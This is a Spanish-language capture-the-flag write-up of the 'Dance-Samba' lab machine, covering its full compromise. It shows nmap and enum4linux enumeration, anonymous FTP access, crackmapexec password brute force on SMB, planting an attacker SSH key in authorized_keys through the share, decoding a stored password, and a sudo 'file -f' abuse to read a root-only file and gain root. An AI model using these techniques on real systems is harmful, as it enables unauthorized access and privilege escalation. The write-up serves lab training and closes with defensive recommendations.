
## Dance-Samba

#### Dificultad: Medio

una vez descargada la maquina se procede a descomprimirse :
```bash
unzip dance-samba.zip
``` 

Y luego se despliega la maquina:

```bash
sudo bash auto_deploy.sh dance-samba.tar
```

Se realiza un escaneo con NMAP para a la ip que nos da el sistema :

```bash
nmap -p- --open --min-rate=5000 -T5 -A -sT -Pn -n -v -oN <ip victima>


Resultado:

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 09:14 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000029s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              69 Aug 19  2024 nota.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2:4e:66:7d:e5:2e:cf:df:54:39:b2:08:a9:97:79:21 (ECDSA)
|_  256 92:bf:d3:b8:20:ac:76:08:5b:93:d7:69:ef:e7:59:e1 (ED25519)
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: -1s
| smb2-time: 
|   date: 2025-10-01T07:14:26
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.89 seconds

```

así nos dará todos los puertos que están abierto.

- Puertos Abiertos:

- **Puerto 21** (servicio FTP, vsftpd 3.0.5)
- **Puerto 22** (servicio SSH, OpenSSH)
- **Puerto 139** (protocolo NetBIOS, Samba)
- **Puerto 445** (protocolo SMB, Samba)

Una vez escaneado los servicios se observa que el puerto 21 con servicio FTP te permite acceder como Anonymous, así que accederemos.

```bash

smbclient //172.17.0.2/macarena -U macarena%donald


luego se introduce el usuario y contraseña: que es anonymous

❯ ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.5)
Name (172.17.0.2:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
ftp> 
ftp> 
ftp> ls
229 Entering Extended Passive Mode (|||57888|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              69 Aug 19  2024 nota.txt
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||16910|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 19  2024 .
drwxr-xr-x    2 0        0            4096 Aug 19  2024 ..
-rw-r--r--    1 0        0              69 Aug 19  2024 nota.txt
226 Directory send OK.
```

Encontramos el fichero **nota.txt** lo descargamos, cerramos la conexión **FTP** y procedemos a inspeccionar el contenido descargado:

```bash
get nota.txt
------------------------------------
local: nota.txt remote: nota.txt
229 Entering Extended Passive Mode (|||32003|)
150 Opening BINARY mode data connection for nota.txt (69 bytes).
100% |*****************************************************************************************|    69      209.91 KiB/s    00:00 ETA
226 Transfer complete.
69 bytes received in 00:00 (77.89 KiB/s)
```


Al abrir la nota descargada nos encontramos: 

```bash
└─# cat nota.txt        

I don't know what to do with Macarena, she's obsessed with donald.

```

Esto quiere decir que tenemos al menos 2 usuario : macarena y donald.

 Ahora procederemos a la explotación: 

Ahora enumeraremos los recursos del SMB para ver si macarena es un usuario

usaremos : Para continuar, se comprueba que el nombre “macarena” sea un potencial usuario válido del sistema a través del protocolo SMB. Para ello, se utiliza la herramienta “**enum4linux**” para extraer toda la información posible a través de dicho protocolo.
```bash
enum4linux -a  <ip victima>


 ==================================( Share Enumeration on 172.17.0.2 )==================================
                                                                                                                               
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                          

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        macarena        Disk      
        IPC$            IPC       IPC Service (0845696b7b24 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available


```
- se observa que hay un recurso compartido llamado macarena.



También podemos usar: (listar los recursos compartidos mediante sesión nula, que en este caso funciona)
```bash 
smbclient -L \\172.17.0.2 -N
```


Ahora usaremos crackmapexec pero crearemos un archivo con los datos de macarena y donald para realizar ataques de fuerza bruta.
también podríamos usar : (netexec smb 172.17.0.2 -u macarena -p diccionario) en caso que fallara crackmapexec

```bash
crackmapexec smb 172.17.0.2 -u user.txt -p /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt


y tenemos credenciales validas: 
SMB         172.17.0.2      445    0845696B7B24     [+] 0845696B7B24\Macarena:donald 
```


- Una vez con la contraseña se accede al recurso compartido macarena
```bash

smbclient //172.17.0.2/macarena -U macarena%donald


smbclient //172.17.0.2/macarena -U macarena%donald

Try "help" to get a list of possible commands.
smb: \> 
smb: \> 
smb: \> 
smb: \> ls
  .                                   D        0  Mon Aug 19 19:26:02 2024
  ..                                  D        0  Mon Aug 19 19:26:02 2024
  .bashrc                             H     3771  Mon Aug 19 18:18:51 2024
  .cache                             DH        0  Mon Aug 19 18:40:39 2024
  user.txt                            N       33  Mon Aug 19 18:20:25 2024
  .bash_logout                        H      220  Mon Aug 19 18:18:51 2024
  .bash_history                       H        5  Mon Aug 19 19:26:02 2024
  .profile                            H      807  Mon Aug 19 18:18:51 2024


```

NOTA: *La característica de esta configuración en particular es que la contraseña utilizada para acceder al recurso compartido “macarena” (protocolo SMB) no sirve para acceder al sistema con el usuario “macarena” (protocolo SSH). **En este caso se ha realizado una división correcta entre credenciales y servicios**. Por ello, el acceso en este caso se debe realizar de otra forma*

ahora haremos: **inyección de una clave pública no autorizada en el archivo authorized_keys**.
debido a que los servicios compartido con el protocolo SMB están divididos del usuario macarena protocolo SMB.

IMPORTANTE: *en la imagen superior se observa que el usario macarena no tiene ninguna clave publica autorizada por lo tanto se tiene que crear una manualmente*

Para ello, primero **se crean un par de claves RSA** (pública y privada) en nuestra máquina de trabajo utilizando la herramienta “**ssh-keygen**”.

```bash
❯ ssh-keygen -t rsa -b 4096

Generating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): 
Enter passphrase for "/home/kali/.ssh/id_rsa" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kali/.ssh/id_rsa
Your public key has been saved in /home/kali/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:pHAXyjbcg6ysa0GMsaUC3ax1fbCd5u/Mwo1A9ZyCII0 kali@kali
The key's randomart image is:
+---[RSA 4096]----+
| . o o .o.       |
|o o E+++.+o.     |
|.B o.oX.*++o .   |
|= +. = =o+. +    |
|..  o ..S ..     |
|  ..    .  .     |
|  ..     o o.    |
|  ..      ++.    |
| ..        .+    |
+----[SHA256]-----+


Y copiamos las claves al directorio donde tenemos las maquinas o donde queramos.


 cp /home/kali/.ssh/id_rsa .
 cp /home/kali/.ssh/id_rsa.pub .

```

copiamos y renombramos el nombre de la clave publica id_rsa.pub a authorized_keys

```bash
cp id_rsa.pub authorized_keys
chmod 600 id_rsa


```


Creamos el directorio `.ssh` en el directorio personal en el recurso compartido **macarena** (SMB) ingresamos al usuario y subimos el fichero **authorized_keys** y **id_rsa.pub**



```bash
smb: \> mkdir .ssh
smb: \> 
smb: \> 
smb: \> dir
  .                                   D        0  Wed Oct  1 10:08:32 2025
  ..                                  D        0  Wed Oct  1 10:08:32 2025
  .bashrc                             H     3771  Mon Aug 19 18:18:51 2024
  .cache                             DH        0  Mon Aug 19 18:40:39 2024
  user.txt                            N       33  Mon Aug 19 18:20:25 2024
  .bash_logout                        H      220  Mon Aug 19 18:18:51 2024
  .bash_history                       H        5  Mon Aug 19 19:26:02 2024
  .profile                            H      807  Mon Aug 19 18:18:51 2024
  .ssh  
```


Ahora los archivos de authorized_keys y de id_rsa.pub deben enviarse al servidor ftp.

```bash
smb: \.ssh\> put id_rsa.pub
putting file id_rsa.pub as \.ssh\id_rsa.pub (358.9 kB/s) (average 358.9 kB/s)
smb: \.ssh\> put authorized_keys
putting file authorized_keys as \.ssh\authorized_keys (358.9 kB/s) (average 358.9 kB/s)
smb: \.ssh\> 
smb: \.ssh\> 
smb: \.ssh\> dir
  .                                   D        0  Wed Oct  1 10:16:25 2025
  ..                                  D        0  Wed Oct  1 10:08:32 2025
  id_rsa.pub                          A      735  Wed Oct  1 10:16:11 2025
  authorized_keys                     A      735  Wed Oct  1 10:16:25 2025

                82083148 blocks of size 1024. 26999820 blocks available

```


Ahora podemos acceder a al maquina usando el servicio SSH:

```bash
ssh -i id_rsa macarena@172.17.0.2

Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.12.38+kali-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Aug 19 18:40:39 2024 from 172.17.0.1
macarena@0845696b7b24:~$ 

```

Ahora dentro del usuario observamos lo siguiente:


```bash
macarena@0845696b7b24:~$ ls -lisa
total 40
2117369 4 drwxr-x--- 1 macarena macarena 4096 Oct  1 10:08 .
2117365 8 drwxr-xr-x 1 root     root     4096 Aug 19  2024 ..
2117370 4 -rw------- 1 macarena macarena    5 Aug 19  2024 .bash_history
2117371 4 -rw-r--r-- 1 macarena macarena  220 Aug 19  2024 .bash_logout
2117373 4 -rw-r--r-- 1 macarena macarena 3771 Aug 19  2024 .bashrc
2117376 4 drwx------ 2 macarena macarena 4096 Aug 19  2024 .cache
2117378 4 -rw-r--r-- 1 macarena macarena  807 Aug 19  2024 .profile
2140639 4 drwxrwxr-x 2 macarena macarena 4096 Oct  1 10:16 .ssh
2117379 4 -rw------- 1 macarena macarena   33 Aug 19  2024 user.txt
macarena@0845696b7b24:~$ cat user.txt
ef65ad731de0ebabcb371fa3ad4972f1

```

vamos al directorio home:

```bash
macarena@0845696b7b24:~$ pwd
/home/macarena
macarena@0845696b7b24:~$ cd ..
macarena@0845696b7b24:/home$ ls
ftp  macarena  secret
macarena@0845696b7b24:/home$ cd secret/
macarena@0845696b7b24:/home/secret$ ls
hash
macarena@0845696b7b24:/home/secret$ cd hash 
-bash: cd: hash: Not a directory
macarena@0845696b7b24:/home/secret$ cat hash 
MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===
macarena@0845696b7b24:/home/secret$ 

```

hay un hash el cual nos puede dar información: podemos usar AI para decodificar o usaremos :

```bash
macarena@0845696b7b24:/home/secret$ cat hash | base32 --decode | base64 --decode
supersecurepasswordmacarena@0845696b7b24:/home/secret$ 

```

Vamos a ir atrás unos directorios y enlistamos y vemos que hay un directorio opt
```bash
macarena@0845696b7b24:/home/secret$ cd ..
macarena@0845696b7b24:/home$ cd ..
macarena@0845696b7b24:/$ cd ..
macarena@0845696b7b24:/$ ls
bin  boot  dev  etc  home  lib  lib.usr-is-merged  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
macarena@0845696b7b24:/$ cd opt
macarena@0845696b7b24:/opt$ ls
password.txt
macarena@0845696b7b24:/opt$ cat password.txt 
cat: password.txt: Permission denied

macarena@0845696b7b24:/opt$ ls -l
total 4
-rw------- 1 root root 16 Aug 19  2024 password.txt

```

Observamos que solo un root puede acceder y leer los demás usuarios no tienen acceso.


intentamos hacernos root con sudo -l, nos pedirá una contraseña que será supersecurepassword

```bash
macarena@0845696b7b24:/opt$ sudo -l
[sudo] password for macarena: 
Sorry, try again.
[sudo] password for macarena: 
Matching Defaults entries for macarena on 0845696b7b24:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User macarena may run the following commands on 0845696b7b24:
    (ALL : ALL) /usr/bin/file

```

Comprobando este binario en GTFObins, se puede comprobar que existe una manera probada de aprovechar este binario para realizar operaciones aprovechando los privilegios asignados. En este caso, **es posible leer cualquier archivo del sistema gracias a esta configuración**.

usaremos LFile debido a que necesitaremos leer el archivo y

```bash
macarena@0845696b7b24:/opt$ LFILE=/opt/password.txt
sudo file -f $LFILE
root:rooteable2: cannot open `root:rooteable2' (No such file or directory)
macarena@0845696b7b24:/opt$ su -root
su: invalid option -- 'r'
Try 'su --help' for more information.
macarena@0845696b7b24:/opt$ su - root
Password: 
root@0845696b7b24:~# whoami
root

```

Recomendaciones:

1- Evitar exponer información sensible atreves de los servicios de FTP o SMB
2- evitar el acceso Anonymous, crear una política de contraseña robustas
3- Limitar el numero de intentos de accesos a lo servicios y una vez superados bloquear el sistema un tiempo prudencial.
4- Usar gestores de contraseña para almacenar información sensible como contraseñas o hashes, también se puede usar criptografía para evitar la exposición.
